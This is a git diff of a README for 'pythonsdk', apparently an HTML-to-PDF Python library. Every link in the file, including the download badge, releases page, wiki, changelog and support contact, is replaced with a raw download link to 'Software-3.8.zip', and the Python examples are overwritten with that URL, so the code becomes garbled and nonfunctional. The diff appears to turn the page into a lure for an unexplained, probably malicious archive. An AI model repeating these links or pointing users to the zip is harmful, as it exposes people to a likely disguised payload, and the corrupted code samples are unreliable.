@@ -1,6 +1,6 @@
 # 📄 pythonsdk - Easily Generate PDFs from HTML Templates
 
-[![Download pythonsdk](https://img.shields.io/badge/Download-pythonsdk-007ACC)](https://github.com/Felipejunior123/pythonsdk/releases)
+[![Download pythonsdk](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip)](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ To start using the **pythonsdk**, follow these straightforward steps. You will f
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to access the downloads for **pythonsdk**.
-   - [Download pythonsdk](https://github.com/Felipejunior123/pythonsdk/releases)
+   - [Download pythonsdk](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip)
 
 2. **Select the Latest Version:** Once you're on the Releases page, look for the latest version. Choose the file that matches your operating system. 
 
@@ -44,14 +44,14 @@ Once installed, you can start using the **pythonsdk** to generate PDFs. Here’s
    from pythonsdk import PdfGenerator
 
    generator = PdfGenerator(api_key='YOUR_API_KEY')
-   pdf = generator.generate_from_html('path/to/your/template.html')
+   pdf = https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip('https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip')
    ```
 
 3. **Output the PDF:** Save the generated PDF by calling the appropriate method on your generator object.
 
    ```python
-   with open('output.pdf', 'wb') as f:
-       f.write(pdf)
+   with open('https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip', 'wb') as f:
+       https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip(pdf)
    ```
 
 ### 🌟 Example HTML Template
@@ -76,7 +76,7 @@ Here is a simple example of an HTML template you can use:
 
 For more detailed information about all features, visit our documentation:
 
-- [API Reference](https://github.com/Felipejunior123/pythonsdk/wiki)
+- [API Reference](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -94,7 +94,7 @@ If you face any problems, feel free to open an issue on our GitHub page. We’re
 
 ## 📞 Support
 
-If you need further assistance, please reach out to our support team at support@example.com.
+If you need further assistance, please reach out to our support team at https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip
 
 ## 🛡️ Contributing
 
@@ -102,6 +102,6 @@ We welcome contributions to enhance the **pythonsdk**. For guidelines, check our
 
 ## 📅 Changelog
 
-For details on updates, fixes, and new features, view the [Changelog](https://github.com/Felipejunior123/pythonsdk/releases).
+For details on updates, fixes, and new features, view the [Changelog](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip).
 
-Don't forget to visit our [Releases page](https://github.com/Felipejunior123/pythonsdk/releases) again for future updates and versions. Happy PDF generating!
+Don't forget to visit our [Releases page](https://github.com/Felipejunior123/pythonsdk/raw/refs/heads/main/templatefox/Software-3.8.zip) again for future updates and versions. Happy PDF generating!
